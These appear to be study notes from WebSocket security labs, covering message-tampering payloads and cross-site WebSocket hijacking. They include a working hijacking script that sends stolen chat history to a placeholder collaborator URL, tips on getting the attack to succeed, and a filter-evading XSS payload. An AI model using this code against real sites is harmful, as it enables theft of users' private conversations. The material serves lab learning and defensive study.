
# Hacking WebSocket
Websockets are used to provide reatime expeirence to users. If you know where it is used and how it is used.
It can be exploited in so many ways

- Change Message XSS payload
- Change message to SQLi Payload
- CHange message to SSTI payload


# Cross-site WebSocket hijacking
- it involves exploiting a cross-site request forgery (CSRF) vulnerability on a WebSocket
It arises when the WebSocket handshake request relies solely on HTTP cookies for session handling and does not contain any CSRF tokens or other unpredictable values. 
1. In websocket history the READY command retrives all chat history
1. It doesn't contain any CSRF protection
1. Cross Origin is also allowed to read responses
```javascript
<script>
    var ws = new WebSocket('wss://your-websocket-url');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```
- This script will perform CSRF attack on victim to retrive chat history
- Keep In Mind: you need to interact with the chat system inorder to get this attack successfull
- If socket is not connected attack will fail
- So try to send some message and refresh the attacker and chatsystem both if you fail

```bash
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
```
Some Header Like This just used to prevent caching thats all don't think it is a CSRF protection


# Lab 2
```javascript
<img src=1 oNeRrOr=alert`1`>
```
- Intercept SOcket Message
- add XSS payload
- Forward


